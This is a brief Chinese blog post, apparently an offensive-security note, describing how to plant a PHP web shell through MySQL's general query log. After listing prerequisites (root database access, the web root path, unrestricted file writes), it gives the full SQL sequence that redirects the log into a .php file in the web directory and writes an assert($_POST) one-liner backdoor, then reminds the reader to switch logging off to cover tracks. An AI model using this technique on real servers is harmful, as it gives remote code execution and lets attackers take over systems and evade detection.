---
title: "MySQL Log Getshell"
date: 2018-01-09T00:00:00+08:00
draft: false
tags: ['mysql']
categories: ['web']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

require:

- root权限.
- 网站物理路径.
- 文件位置未被限制.

<!--more-->

```
set global general_log = on;
set global general_log_file = 'F:/phpStudy/WWW/a.php';
select '<?php assert($_POST[a]) ?>';
set global general_log = off;
```

别忘了处理后事 (off).